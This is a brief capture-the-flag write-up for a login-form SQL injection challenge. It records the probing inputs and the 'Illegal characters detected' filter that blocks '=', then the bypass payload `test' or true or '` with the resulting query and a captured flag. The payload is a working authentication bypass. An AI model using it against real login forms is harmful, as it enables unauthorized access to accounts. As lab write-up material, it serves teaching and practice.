## Solution

By submitting `test'` we receive the following error message:

```
Wrong username / password.
```

We then try `test' or '1'='1`:

```
Illegal characters detected.
```

After several trials we understand the `=` sign is detected as an illegal character. So we simply transform the above condition into `test' or true or '`

```
SELECT ... FROM ... WHERE username='test' or true or '' AND password=''
```

|Field  | Value |
| ------------- | ------------- |
|username|test' or true or '|
|password|/* Any value, does not matter */|

And we obtain the Flag `FLAG-4f885o1dal0q1huj6eaxuatcvn`
